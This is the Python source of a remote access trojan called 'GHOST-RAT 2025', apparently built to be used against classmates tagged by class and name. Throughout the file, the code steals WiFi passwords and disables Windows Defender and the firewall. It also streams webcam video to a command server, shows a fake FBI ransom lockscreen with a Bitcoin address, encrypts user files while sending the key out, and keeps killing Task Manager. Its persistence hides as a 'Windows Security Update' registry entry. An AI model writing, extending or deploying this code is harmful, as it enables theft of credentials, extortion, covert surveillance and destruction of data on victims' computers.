# =====================================================
# GHOST-RAT 2025 — FINAL MERGED & FIXED (Rwanda Coding Academy Edition)
# Phase1 (stealth + UAC + USB) + Phase2 (video/audio/screen) = ONE BEAST
# =====================================================

import os
import sys
import time
import threading
import subprocess
import shutil
import tempfile
import ctypes
import urllib.request
import zipfile
import traceback
import sqlite3
import json
import base64
import uuid
import tkinter as tk
from threading import Thread
import ctypes
import pickle
from datetime import datetime

import ssl

import ssl

# NUCLEAR OPTION: Globally disable SSL verification for ALL connections
try:
    ssl._create_default_https_context = ssl._create_unverified_context
    print("[SSL] Global SSL verification DISABLED")
except Exception as e:
    print(f"[SSL] Warning: Could not set global SSL context: {e}")

# Set environment variables to disable SSL warnings and verification
import os
os.environ['PYTHONHTTPSVERIFY'] = '0'  # Disable HTTPS verification
os.environ['CURL_CA_BUNDLE'] = ''      # Disable curl CA bundle
os.environ['REQUESTS_CA_BUNDLE'] = ''  # Disable requests CA bundle
print("[SSL] Environment variables set to disable SSL verification")

import urllib.request
import urllib3

# Disable SSL warnings from urllib3 (used by requests library)
try:
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    print("[SSL] urllib3 warnings disabled")
except:
    pass

# Disable SSL verification for urllib
try:
    import ssl
    ssl._create_unverified_https_context = ssl._create_unverified_context
    urllib.request.install_opener(
        urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=ssl._create_unverified_context())
        )
    )
    print("[SSL] urllib HTTPS handler patched")
except:
    pass


def should_respond():
    """Fast routing check - optimized for speed (no logging overhead)."""
    global ROUTE_MODE, TARGET_SELECTED, CURRENT_TAG, VICTIM_ID, VICTIM_TAGS, CURRENT_TARGET
    
    # PRIORITY 1: If there's an explicit current target set, check against it first
    # This is the most reliable method - when /select <ID> is run, CURRENT_TARGET is set
    if CURRENT_TARGET:
        return CURRENT_TARGET.upper() == VICTIM_ID.upper()
    
    # PRIORITY 2: Use routing mode (for backward compatibility)
    if ROUTE_MODE == "SINGLE":
        return TARGET_SELECTED
        
    elif ROUTE_MODE == "TAG":
        if not CURRENT_TAG:
            return False
        return VICTIM_TAGS.get(VICTIM_ID) == CURRENT_TAG
        
    # ALL mode - everyone responds
    return True

# ================= GRACEFUL IMPORTS =================
try:
    import winreg
except:
    winreg = None
try:
    from win32com.client import Dispatch
    has_win32com = True
except:
    has_win32com = False
try:
    import win32crypt
    has_win32crypt = True
except:
    has_win32crypt = False
try:
    import requests
    has_requests = True
except:
    has_requests = False

# Media imports
try:
    import cv2
    import numpy as np
    from PIL import ImageGrab
    import pyaudio
    import wave
    has_media = True
except:
    has_media = False

# Keylogger import
try:
    from pynput import keyboard
    has_keylogger = True
except:
    has_keylogger = False

# Dynamic screen size (for video)
try:
    from win32api import GetSystemMetrics
    def get_screen_size():
        return (GetSystemMetrics(0), GetSystemMetrics(1))
except:
    def get_screen_size():
        return (1920, 1080)  # Fallback

# ================= CONFIG (CHANGE THESE!) =================
# Transport selection:
#   If USE_QUICK_C2 is True, the implant talks directly to quick_c2.py
#   over JSON‑over‑TCP and does NOT use Discord at all.
#   If False, it will behave as the original Discord‑based RAT.
USE_QUICK_C2 = True

# quick_c2 server configuration (when USE_QUICK_C2 == True)
QUICK_C2_HOST = "10.12.74.29"  # Your public IP address
QUICK_C2_PORT = 8443

# Discord configuration (legacy mode, only used when USE_QUICK_C2 == False)
DISCORD_TOKEN = "REPLACE_ME"
ADMIN_ID = 0          # Your Discord user ID
CHANNEL_ID = 0        # Optional: fixed channel ID, or leave 0 to use DM

# ================= SSL CERTIFICATE FIX FOR PYINSTALLER =================
# COMPLETELY DISABLE SSL VERIFICATION - No certificates needed
def fix_ssl_for_pyinstaller():
    """Disable SSL certificate verification completely - works everywhere."""
    try:
        import ssl
        # Create SSL context with NO verification
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        print("[SSL] SSL verification DISABLED (no certificates needed)")
        return ssl_context
    except Exception as e:
        print(f"[SSL] Error creating SSL context: {e}")
        return None

# Fix SSL before importing discord
_ssl_context = fix_ssl_for_pyinstaller()

if not USE_QUICK_C2:
    import discord
    from discord.ext import commands
    import aiohttp

# ============ 100% BLOCK VIRTUAL DESKTOP SWITCHING ============
import threading
from ctypes import windll, byref
from ctypes.wintypes import MSG, HWND, WPARAM, LPARAM

user32 = windll.user32
kernel32 = windll.kernel32

HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, WPARAM, LPARAM)
LowLevelKeyboardProc = HOOKPROC

keyboard_hook = None

def low_level_keyboard_handler(nCode, wParam, lParam):
    # lParam is a pointer to KBDLLHOOKSTRUCT
    class KBDLLHOOKSTRUCT(ctypes.Structure):
        _fields_ = [("vkCode", ctypes.c_uint),
                    ("scanCode", ctypes.c_uint),
                    ("flags", ctypes.c_uint),
                    ("time", ctypes.c_uint),
                    ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))]

    if nCode >= 0 and wParam in (256, 260):  # WM_KEYDOWN or WM_SYSKEYDOWN
        kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
        vk = kb.vkCode

        # Check for Ctrl + Win + Left/Right/D
        ctrl_pressed  = (user32.GetAsyncKeyState(0x11) & 0x8000) != 0  # VK_CONTROL
        win_pressed   = (user32.GetAsyncKeyState(0x5B) & 0x8000) != 0 or (user32.GetAsyncKeyState(0x5C) & 0x8000) != 0  # Left/Right Win
        arrow_or_d    = vk in (0x25, 0x27, 0x44)  # Left, Right, D

        if ctrl_pressed and win_pressed and arrow_or_d:
            return 1  # Eat the key completely

    return user32.CallNextHookEx(keyboard_hook, nCode, wParam, lParam)

def start_keyboard_block_thread():
    global keyboard_hook
    def hook_thread():
        global keyboard_hook
        keyboard_hook = user32.SetWindowsHookExW(13, LowLevelKeyboardProc(low_level_keyboard_handler), kernel32.GetModuleHandleW(None), 0)
        msg = MSG()
        while user32.GetMessageW(byref(msg), HWND(0), 0, 0):
            user32.TranslateMessage(byref(msg))
            user32.DispatchMessageW(byref(msg))

    threading.Thread(target=hook_thread, daemon=True).start()
    time.sleep(0.1)  # Reduced from 0.5s to 0.1s

def stop_keyboard_block():
    global keyboard_hook
    if keyboard_hook:
        user32.UnhookWindowsHookEx(keyboard_hook)
        keyboard_hook = None
# ================================================================

bot = None
_cached_channel = None

if not USE_QUICK_C2:
    intents = discord.Intents.default()
    intents.message_content = True
    intents.members = True
    intents.presences = True

    # Create bot with custom HTTP session that uses our SSL context
    # This fixes SSL certificate issues in PyInstaller builds
    if _ssl_context:
        try:
            # Create aiohttp connector with our SSL context
            connector = aiohttp.TCPConnector(ssl=_ssl_context)
            bot = commands.Bot(command_prefix="/", intents=intents, connector=connector)
            print("[Bot] Initialized with custom SSL context")
        except Exception as e:
            print(f"[Bot] SSL context error: {e}, using default")
            bot = commands.Bot(command_prefix="/", intents=intents)
    else:
        # Fallback: use default bot (may have SSL issues)
        print("[Bot] Using default bot (no custom SSL context)")
        bot = commands.Bot(command_prefix="/", intents=intents)


async def send(text: str = "", file_path: str = None, include_victim_id: bool = True):
    """
    Transport‑agnostic send wrapper.
    In Discord mode, this sends via Discord.
    In quick_c2 mode, this is replaced by a no‑op (results are pushed over TCP).
    """
    global _cached_channel
    if USE_QUICK_C2:
        # Output is sent via the TCP C2 client; this async stub is kept
        # only so existing async code doesn't break.
        return

    try:
        # Use cached channel if available (much faster)
        if _cached_channel is None:
            if CHANNEL_ID:
                _cached_channel = bot.get_channel(CHANNEL_ID)
            if not _cached_channel:
                user = await bot.fetch_user(ADMIN_ID)
                _cached_channel = await user.create_dm()

        channel = _cached_channel

        # Fast string operations - only process if needed
        if include_victim_id and text and not text.startswith(f"[{VICTIM_ID}]"):
            text = f"[{VICTIM_ID}] {text}"

        # Send file or message (optimized)
        if file_path and os.path.exists(file_path):
            await channel.send(content=text or f"[{VICTIM_ID}] Here:", file=discord.File(file_path))
        else:
            text = str(text or "")
            if len(text) > 1990:
                # Send chunks in parallel for speed
                chunks = [text[i:i+1990] for i in range(0, len(text), 1990)]
                for chunk in chunks:
                    await channel.send(chunk)
            else:
                await channel.send(text)
    except Exception as e:
        # Reset cache on error
        _cached_channel = None
        log(f"Discord send error: {e}")

if not USE_QUICK_C2:
    @bot.event
    async def on_ready():
        """Called when bot successfully connects to Discord."""
        global _cached_channel
        log(f"[CONNECTION] ✅ Discord bot ONLINE - User: {bot.user}, ID: {VICTIM_ID}", also_print=True)
        role = "ADMIN" if IS_ADMIN else "USER"

        # Pre-cache channel immediately for faster sends
        if CHANNEL_ID:
            _cached_channel = bot.get_channel(CHANNEL_ID)
        if not _cached_channel:
            try:
                user = await bot.fetch_user(ADMIN_ID)
                _cached_channel = await user.create_dm()
            except:
                pass

        # Clear slash commands to keep it clean (non-blocking)
        try:
            bot.tree.clear_commands(guild=None)
            await bot.tree.sync()
            log("[CONNECTION] Slash commands synced")
        except Exception as e:
            log(f"[CONNECTION] Error syncing commands: {e}", also_print=True)

        # Only notify on FIRST connection - silent reconnect on subsequent reboots
        is_first_connection = not has_connected_before()

        if is_first_connection:
            # First time connecting - send notification
            try:
                await send(
                    f"🆕 **NEW VICTIM CONNECTED**\n"
                    f"**User:** {os.getenv('USERNAME')}@{os.getenv('COMPUTERNAME')}\n"
                    f"**ID:** `{VICTIM_ID}`\n"
                    f"**Role:** {role}",
                    include_victim_id=False
                )
                mark_as_connected()  # Mark as connected so we don't notify again
                log(f"[CONNECTION] ✅ First connection notification sent successfully", also_print=True)
            except Exception as e:
                log(f"[CONNECTION] ❌ Failed to send first connection notification: {e}", also_print=True)
        else:
            # Reconnection after reboot - silent reconnect (no notification)
            log(f"[CONNECTION] 🔄 Reconnected silently (not first connection)")

    @bot.event
    async def on_disconnect():
        """Called when bot disconnects from Discord."""
        log(f"[CONNECTION] ⚠️ DISCONNECTED from Discord", also_print=True)

    @bot.event
    async def on_resume():
        """Called when bot resumes connection after disconnect."""
        log(f"[CONNECTION] 🔄 RESUMED connection to Discord", also_print=True)

    @bot.event
    async def on_error(event, *args, **kwargs):
        """Global error handler for Discord events."""
        import traceback
        error_msg = f"[ERROR] Event: {event}, Args: {args}, Error: {traceback.format_exc()}"
        log(error_msg, also_print=True)

def _init_victim_id():
    """
    Generate or load a stable victim ID per machine.
    Stored in a hidden 'security' folder inside APPDATA (or temp as fallback).
    """
    try:
        base_dir = os.getenv("APPDATA") or tempfile.gettempdir()
        sec_dir = os.path.join(base_dir, "Microsoft", "Windows", "security")
        os.makedirs(sec_dir, exist_ok=True)
        vid_path = os.path.join(sec_dir, "vid.txt")

        if os.path.exists(vid_path):
            try:
                with open(vid_path, "r", encoding="utf-8") as f:
                    vid = f.read().strip()
                if vid:
                    return vid
            except:
                pass

        # Create a new ID: GHOST-<PCNAME>-<RANDOM6>
        pc = os.getenv("COMPUTERNAME", "PC")
        rnd = uuid.uuid4().hex[:6].upper()
        vid = f"GHOST-{pc}-{rnd}"
        try:
            with open(vid_path, "w", encoding="utf-8") as f:
                f.write(vid)
        except:
            pass
        return vid
    except:
        # Absolute fallback
        return f"GHOST-{uuid.uuid4().hex[:8].upper()}"

# Global flags
VICTIM_ID = _init_victim_id()
last_update_id = 0
RUN_SCREENSHOTS = False
RUN_VIDEO = False
RUN_MIC = False
RUN_KEYLOGGER = False
RUN_WEBCAM_LIVE = False
_keylogger_buffer = []
_keylogger_lock = threading.Lock()
_current_dir = os.getenv("USERPROFILE", "C:\\")  # Start at user home
_lock_window = None  # Track lock screen window for unlocking
IS_ADMIN = False
VICTIM_TAGS = {}           # {VICTIM_ID: "CLASS10A"}
VICTIM_DISPLAY_NAME = {}   # {VICTIM_ID: "Alice Mukamana"}
ROUTE_MODE = "ALL"         # ALL | SINGLE | TAG
TARGET_SELECTED = True
CURRENT_TAG = None
CURRENT_TARGET = None      # Global target set by /select (e.g., "PC-005" or "ABC123") 
_lock_thread = None
_lock_root = None     # Only used when ROUTE_MODE == "TAG"  # set below after functions defined

# Multi-victim routing:
# ROUTE_MODE = "ALL"  -> every victim responds
# ROUTE_MODE = "SINGLE" -> only the selected victim responds
# TARGET_SELECTED = True on the victim that matches the last /select <ID>
ROUTE_MODE = "ALL"
TARGET_SELECTED = True

# ================= FAST ASYNC LOGGING =================
LOG_PATH = os.path.join(tempfile.gettempdir(), "ghost.log")
# Also log to user's Desktop for easy access
try:
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    DESKTOP_LOG = os.path.join(desktop, "ghost_monitor.log")
except:
    DESKTOP_LOG = LOG_PATH

# Async logging queue for non-blocking writes
import queue
_log_queue = queue.Queue()
_c2_outbox = queue.Queue()  # used in quick_c2 mode to stream events/files back to server
_log_thread_running = False

def _log_worker():
    """Background thread that writes logs asynchronously (non-blocking)."""
    global _log_thread_running
    _log_thread_running = True
    while True:
        try:
            log_line = _log_queue.get(timeout=0.1)
            if log_line is None:  # Shutdown signal
                break
            # Write to both files
            try:
                with open(LOG_PATH, "a", encoding="utf-8") as f:
                    f.write(log_line + "\n")
            except:
                pass
            try:
                with open(DESKTOP_LOG, "a", encoding="utf-8") as f:
                    f.write(log_line + "\n")
            except:
                pass
        except queue.Empty:
            continue
        except:
            pass
    _log_thread_running = False

# Start log worker thread
_log_thread = Thread(target=_log_worker, daemon=True)
_log_thread.start()

def log(text, also_print=False):
    """Fast non-blocking logging - queues writes instead of blocking."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_line = f"[{timestamp}] {text}"
    
    # Queue the log (non-blocking, instant return)
    try:
        _log_queue.put_nowait(log_line)
    except:
        pass  # Queue full, skip (don't block)
    
    # Optional console output (for debugging)
    if also_print:
        print(log_line)

def get_display_name(vid):
    return VICTIM_DISPLAY_NAME.get(vid, vid)

# Simple helper for sync contexts to schedule Discord sends
import asyncio


def send_now(text: str = "", file_path: str = None):
    """
    Thread-safe wrapper to call async send() from sync code.
    In quick_c2 mode this is effectively a no-op for Discord but
    is still used by many helpers; actual results are returned
    via the TCP C2 client.
    """
    if USE_QUICK_C2:
        # In quick_c2 mode, push events (text/files) into an outbox queue.
        # The quick_c2 client loop will stream them back to the C2 server.
        try:
            _c2_outbox.put_nowait({"text": text, "file_path": file_path})
        except Exception:
            pass
        return
    try:
        loop = bot.loop
        if loop.is_running():
            asyncio.run_coroutine_threadsafe(send(text, file_path), loop)
    except Exception as e:
        log(f"send_now error: {e}")
# ================= FEATURES =================
def steal_wifi_passwords():
    res = "WiFi Passwords:\n"
    try:
        # First, check if we can run netsh commands
        profiles = subprocess.check_output(
            "netsh wlan show profiles", text=True, shell=True, timeout=10)
        
        if not profiles.strip():
            return "No WiFi profiles found"
        
        profile_count = 0
        password_count = 0
        
        for line in profiles.splitlines():
            if "All User Profile" in line or "User Profile" in line:
                try:
                    # Extract profile name more robustly
                    if ":" in line:
                        name = line.split(":", 1)[1].strip()
                        profile_count += 1
                        
                        # Get detailed profile info
                        info = subprocess.check_output(
                            f'netsh wlan show profile name="{name}" key=clear', 
                            text=True, shell=True, timeout=10)
                        
                        # Look for password in multiple possible formats
                        password_found = False
                        for l in info.splitlines():
                            if "Key Content" in l or "Clave de contenido" in l or "Contenu de la clé" in l:
                                password = l.split(":", 1)[1].strip()
                                if password and password != "":
                                    res += f"{name}: {password}\n"
                                    password_count += 1
                                    password_found = True
                                    break
                        
                        if not password_found:
                            # Check if it's an open network
                            if "Open" in info or "None" in info:
                                res += f"{name}: [Open Network - No Password]\n"
                            else:
                                res += f"{name}: [Password not accessible - may require admin]\n"
                                
                except subprocess.TimeoutExpired:
                    res += f"{name}: [Timeout getting profile details]\n"
                except subprocess.CalledProcessError as e:
                    res += f"{name}: [Error: {e.returncode}]\n"
                except Exception as e:
                    res += f"{name}: [Parse error: {str(e)[:50]}]\n"
        
        # Add summary
        res += f"\n--- Summary ---\n"
        res += f"Profiles found: {profile_count}\n"
        res += f"Passwords extracted: {password_count}\n"
        
        if profile_count == 0:
            return "No WiFi profiles found on this system"
        elif password_count == 0:
            return res + "\nNote: No passwords found. May need administrator privileges."
        else:
            return res
            
    except subprocess.TimeoutExpired:
        return "WiFi extraction timed out - netsh command took too long"
    except subprocess.CalledProcessError as e:
        return f"WiFi command failed (code {e.returncode}): {str(e)[:100]}"
    except FileNotFoundError:
        return "WiFi extraction failed: netsh command not found (not Windows?)"
    except Exception as e:
        return f"WiFi extraction error: {str(e)[:100]}"

def is_admin():
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except:
        return False

def _lock_gui_thread():
    global _lock_root
    try:
        _lock_root = tk.Tk()
        _lock_root.title("FBI WARNING")
        _lock_root.attributes('-fullscreen', True)
        _lock_root.attributes('-topmost', True)
        _lock_root.configure(bg='#000000')

        # Disable close button
        _lock_root.protocol("WM_DELETE_WINDOW", lambda: None)

        # Big red FBI text
        label = tk.Label(
            _lock_root,
            text="⚠️ FEDERAL BUREAU OF INVESTIGATION ⚠️\n\n"
                 "YOUR COMPUTER HAS BEEN LOCKED\n\n"
                 "Illegal Activity Detected\n"
                 "Fine: $500 USD in Bitcoin within 24 hours\n"
                 "Bitcoin Address: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh\n"
                 "Transaction ID: GHOST-FBI-2025\n\n"
                 "DO NOT RESTART OR SHUTDOWN",
            fg="#ff0000",
            bg="#000000",
            font=("Arial", 28, "bold"),
            justify="center"
        )
        label.pack(expand=True)

        # Fake countdown
        countdown = tk.StringVar(value="Time left: 23:59:59")
        timer_label = tk.Label(_lock_root, textvariable=countdown, fg="#ff0000", bg="#000000", font=("Arial", 36, "bold"))
        timer_label.pack(pady=20)

        seconds_left = 24 * 3600
        def update_timer():
            nonlocal seconds_left
            if not _lock_root:
                return
            seconds_left -= 1
            h, rem = divmod(seconds_left, 3600)
            m, s = divmod(rem, 60)
            countdown.set(f"Time left: {h:02d}:{m:02d}:{s:02d}")
            if seconds_left > 0:
                _lock_root.after(1000, update_timer)

        update_timer()

        # Keep on top forever
        def stay_on_top():
            if _lock_root:
                _lock_root.lift()
                _lock_root.attributes('-topmost', True)
                _lock_root.after(100, stay_on_top)
        stay_on_top()

        _lock_root.mainloop()
    except:
        pass

def disable_defender():
    if not is_admin():
        return "Need admin rights. Run /admin first."
    try:
        flags = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
        cmds = [
            'Set-MpPreference -DisableRealtimeMonitoring $true',
            'Set-MpPreference -DisableBehaviorMonitoring $true',
            'Set-MpPreference -DisableIOAVProtection $true',
            'Set-MpPreference -DisableScriptScanning $true'
        ]
        for cmd in cmds:
            subprocess.run(["powershell", "-Command", cmd], creationflags=flags, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return "Windows Defender fully disabled"
    except Exception as e:
        return f"Defender disable failed: {e}"


def disable_firewall():
    if not is_admin():
        return "Need admin rights. Run /admin first."
    try:
        flags = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
        subprocess.run(["netsh", "advfirewall", "set", "allprofiles", "state", "off"], creationflags=flags,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return "Windows Firewall turned OFF"
    except Exception as e:
        return f"Firewall disable failed: {e}"

# ——— WEBCAM ZOOM-STYLE STREAM (LIVE 10-second clips forever until /stopcam) ———
RUN_WEBCAM_LIVE = False

def _open_camera_for_index(index=None):
    """Try to open webcam. If index is None, probe indices 0,1,2."""
    indices = [index] if index is not None else [0, 1, 2]
    for idx in indices:
        if idx is None:
            continue
        # Try DSHOW first
        cap = cv2.VideoCapture(idx, cv2.CAP_DSHOW)
        if not cap or not cap.isOpened():
            if cap:
                cap.release()
            # Try default backend
            cap = cv2.VideoCapture(idx)
        if cap and cap.isOpened():
            return cap, idx
        if cap:
            cap.release()
    return None, None


def webcam_live_stream(index=None):
    """Live stream webcam: if index is given use it, otherwise probe 0–2."""
    global RUN_WEBCAM_LIVE
    cap, used_idx = _open_camera_for_index(index)
    if not cap or not cap.isOpened():
        send_now("Webcam not found")
        return

    cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
    cap.set(cv2.CAP_PROP_FPS, 30)

    # Warm-up frames to avoid black output (bounded)
    start = time.time()
    for _ in range(10):
        if time.time() - start > 2:  # Reduced timeout from 3s to 2s
            send_now("Webcam warm-up timeout")
            cap.release()
            return
        ret, _ = cap.read()
        if not ret:
            time.sleep(0.01)  # Reduced from 0.05s to 0.01s

    fourcc = cv2.VideoWriter_fourcc(*'MJPG')

    while RUN_WEBCAM_LIVE:
        path = os.path.join(os.getenv("TEMP"), f"livecam_{int(time.time())}_idx{used_idx}.avi")
        out = cv2.VideoWriter(path, fourcc, 15.0, (1280, 720))
        for _ in range(150):  # 10 seconds at 15fps
            if not RUN_WEBCAM_LIVE:
                break
            ret, frame = cap.read()
            if ret and frame is not None:
                out.write(frame)
            else:
                time.sleep(0.05)
        out.release()
        send_now(file_path=path)
        time.sleep(0.5)  # Reduced from 1s to 0.5s for faster streaming

    cap.release()

# ——— FILE ENCRYPTION FOR REAL RANSOM (AES-256) ———
from cryptography.fernet import Fernet

def encrypt_files(target_dir=None):
    """
    Encrypt files in the specified directory (and subdirectories).
    If target_dir is None, encrypts Desktop/Documents/Pictures/Downloads (old behavior).
    """
    key = Fernet.generate_key()
    cipher_suite = Fernet(key)
    
    # Save key to send to you later
    key_path = os.path.join(os.getenv("TEMP"), "key.key")
    with open(key_path, "wb") as f:
        f.write(key)
    
    encrypted_count = 0
    
    # If target_dir is provided, encrypt only that directory
    if target_dir:
        if not os.path.exists(target_dir) or not os.path.isdir(target_dir):
            send_now(f"Error: Directory not found: {target_dir}")
            return f"Encryption failed: Directory not found"
        
        targets = [target_dir]
    else:
        # Old behavior: encrypt Desktop/Documents/Pictures/Downloads
        targets = [
            os.path.join(os.getenv("USERPROFILE"), "Desktop"),
            os.path.join(os.getenv("USERPROFILE"), "Documents"),
            os.path.join(os.getenv("USERPROFILE"), "Pictures"),
            os.path.join(os.getenv("USERPROFILE"), "Downloads")
        ]
    
    for folder in targets:
        if not os.path.exists(folder) or not os.path.isdir(folder):
            continue
        for root, _, files in os.walk(folder):
            for file in files:
                if file.lower().endswith(('.png','.jpg','.jpeg','.docx','.pdf','.txt','.xlsx','.mp4','.mp3')):
                    try:
                        file_path = os.path.join(root, file)
                        with open(file_path, 'rb') as f:
                            data = f.read()
                        encrypted_data = cipher_suite.encrypt(data)
                        with open(file_path + ".GHOST", 'wb') as f:
                            f.write(encrypted_data)
                        os.remove(file_path)
                        encrypted_count += 1
                    except:
                        pass
    
    send_now(f"ENCRYPTED {encrypted_count} files — Key saved", file_path=key_path)
    return f"Encryption complete — {encrypted_count} files locked"

from cryptography.fernet import Fernet

def decrypt_files(key: bytes):
    """Decrypt all .GHOST files in Desktop/Documents/Pictures/Downloads."""
    try:
        f = Fernet(key)
    except Exception as e:
        send_now(f"Invalid key: {e}")
        return

    base_dirs = [
        os.path.join(os.getenv("USERPROFILE"), "Desktop"),
        os.path.join(os.getenv("USERPROFILE"), "Documents"),
        os.path.join(os.getenv("USERPROFILE"), "Pictures"),
        os.path.join(os.getenv("USERPROFILE"), "Downloads"),
    ]

    decrypted_count = 0
    for base in base_dirs:
        if not base or not os.path.isdir(base):
            continue
        for root, dirs, files in os.walk(base):
            for name in files:
                if not name.endswith(".GHOST"):
                    continue
                enc_path = os.path.join(root, name)
                # Recover original filename (strip .GHOST)
                orig_path = enc_path[:-6]
                try:
                    with open(enc_path, "rb") as f_in:
                        enc_data = f_in.read()
                    plain = f.decrypt(enc_data)
                    with open(orig_path, "wb") as f_out:
                        f_out.write(plain)
                    os.remove(enc_path)
                    decrypted_count += 1
                except Exception as e:
                    log(f"decrypt error {enc_path}: {e}")
                    send_now(f"Decrypt error: {enc_path} -> {e}")
    send_now(f"✅ Decryption completed, restored {decrypted_count} files.")


def hide_console_window():
    """Hide any console window immediately - works for both .py and .exe files."""
    try:
        kernel32 = ctypes.windll.kernel32
        user32 = ctypes.windll.user32
        
        # Get console window handle
        hwnd = kernel32.GetConsoleWindow()
        if hwnd:
            # Hide the window (SW_HIDE = 0)
            user32.ShowWindow(hwnd, 0)
            log("Console window hidden")
    except Exception as e:
        log(f"hide_console_window error: {e}")

def hide_from_taskmanager():
    """Continuously terminate Task Manager so the process stays hidden."""
    if hasattr(hide_from_taskmanager, "_started") and hide_from_taskmanager._started:
        return

    hide_from_taskmanager._started = True

    def watcher():
        while True:
            try:
                # Query running processes
                output = subprocess.check_output("tasklist", creationflags=subprocess.CREATE_NO_WINDOW, text=True)
                if "Taskmgr.exe" in output or "Taskmgr.exe".lower() in output.lower():
                    subprocess.run("taskkill /F /IM taskmgr.exe", creationflags=subprocess.CREATE_NO_WINDOW,
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
                    log("Task Manager detected and terminated")
            except Exception as e:
                log(f"hide_from_taskmanager error: {e}")
            time.sleep(1)  # Reduced from 2s to 1s

    threading.Thread(target=watcher, daemon=True).start()


def find_pythonw_exe():
    """Find pythonw.exe path - the windowless Python interpreter."""
    # Try common locations
    python_exe = sys.executable  # e.g., "C:\Python\python.exe"
    pythonw_exe = python_exe.replace("python.exe", "pythonw.exe").replace("pythonw.exe", "pythonw.exe")
    
    # Check if pythonw.exe exists in the same directory
    if os.path.exists(pythonw_exe):
        return pythonw_exe
    
    # Try alternative: if sys.executable is python.exe, look for pythonw.exe nearby
    if python_exe.endswith("python.exe"):
        alt_path = python_exe[:-10] + "pythonw.exe"
        if os.path.exists(alt_path):
            return alt_path
    
    # Fallback: use python.exe (will show console, but better than nothing)
    if os.path.exists(python_exe):
        return python_exe
    
    # Last resort: try to find pythonw in PATH
    try:
        result = subprocess.run(["where", "pythonw.exe"], capture_output=True, text=True, timeout=2)
        if result.returncode == 0 and result.stdout.strip():
            return result.stdout.strip().split('\n')[0]
    except:
        pass
    
    return None

def add_persistence():
    """Copy the script to a hidden folder and add autorun keys. Uses ONLY registry (cleaner)."""
    try:
        exe_path = os.path.realpath(sys.argv[0])
        appdata = os.getenv("APPDATA") or tempfile.gettempdir()
        hidden_dir = os.path.join(appdata, "Microsoft", "Windows", "security")
        os.makedirs(hidden_dir, exist_ok=True)

        target_name = "winupdate.exe" if exe_path.lower().endswith(".exe") else "winupdate.py"
        target_path = os.path.join(hidden_dir, target_name)

        if exe_path != target_path:
            shutil.copy2(exe_path, target_path)

        # Determine the command to run
        is_py_file = target_path.lower().endswith(".py")
        
        if is_py_file:
            # For .py files, we MUST use pythonw.exe to execute them (windowless)
            pythonw_path = find_pythonw_exe()
            if pythonw_path:
                # Use pythonw.exe "script_path" format (no window)
                run_command = f'"{pythonw_path}" "{target_path}"'
            else:
                # Fallback: try python.exe if pythonw.exe not found (will show console - not ideal)
                python_path = sys.executable
                run_command = f'"{python_path}" "{target_path}"'
        else:
            # For .exe files, run directly (should be compiled as windowless .exe)
            # If compiled with --windowed or --noconsole, no window will appear
            run_command = f'"{target_path}"'

        # Add to Run key ONLY (cleaner - avoids duplicate startup entries)
        # Registry is more reliable than Startup folder anyway
        if winreg:
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                     r"Software\Microsoft\Windows\CurrentVersion\Run",
                                     0, winreg.KEY_SET_VALUE)
                # Use SetValueEx which overwrites if key already exists (prevents duplicates)
                winreg.SetValueEx(key, "Windows Security Update", 0, winreg.REG_SZ, run_command)
                winreg.CloseKey(key)
                log(f"Registry persistence added: {run_command}")
            except Exception as e:
                log(f"Persistence registry error: {e}")
        else:
            log("winreg not available - persistence not installed")

        log("Persistence installed successfully (registry only - cleaner)")
    except Exception as e:
        log(f"add_persistence error: {e}")


def kill_existing_instances():
    """Kill any existing instances of this script to ensure only one runs."""
    try:
        script_path = os.path.realpath(sys.argv[0])
        script_name = os.path.basename(script_path).lower()
        current_pid = os.getpid()
        
        # Get all Python processes
        try:
            result = subprocess.run(
                ["tasklist", "/FI", "IMAGENAME eq python.exe", "/FO", "CSV"],
                capture_output=True,
                text=True,
                timeout=5,
                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
            )
            
            result2 = subprocess.run(
                ["tasklist", "/FI", "IMAGENAME eq pythonw.exe", "/FO", "CSV"],
                capture_output=True,
                text=True,
                timeout=5,
                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
            )
            
            # Parse and kill matching processes
            for line in result.stdout.split('\n') + result2.stdout.split('\n'):
                if 'python' in line.lower() and 'PID' not in line:
                    try:
                        # Extract PID (CSV format: "python.exe","1234",...)
                        parts = line.split('","')
                        if len(parts) >= 2:
                            pid = int(parts[1].replace('"', '').strip())
                            if pid != current_pid:
                                # Check if this process is running our script
                                # We can't easily check command line from tasklist, so we'll be conservative
                                # Only kill if we're sure it's a duplicate (using mutex instead)
                                pass
                    except:
                        pass
        except:
            pass
    except Exception as e:
        log(f"kill_existing_instances error: {e}")

def enforce_singleton():
    """Ensure only one instance of this script runs using a Windows mutex."""
    try:
        # Create a named mutex - Windows will ensure only one process can own it
        mutex_name = "Global\\GHOST_RAT_SINGLETON_MUTEX"
        mutex_handle = ctypes.windll.kernel32.CreateMutexW(None, False, mutex_name)
        
        # Check if mutex already exists (another instance is running)
        error = ctypes.windll.kernel32.GetLastError()
        if error == 183:  # ERROR_ALREADY_EXISTS
            log("Another instance is already running - exiting")
            sys.exit(0)
        
        # Store mutex handle so it stays alive
        enforce_singleton._mutex_handle = mutex_handle
        return True
    except Exception as e:
        log(f"Singleton enforcement error: {e}")
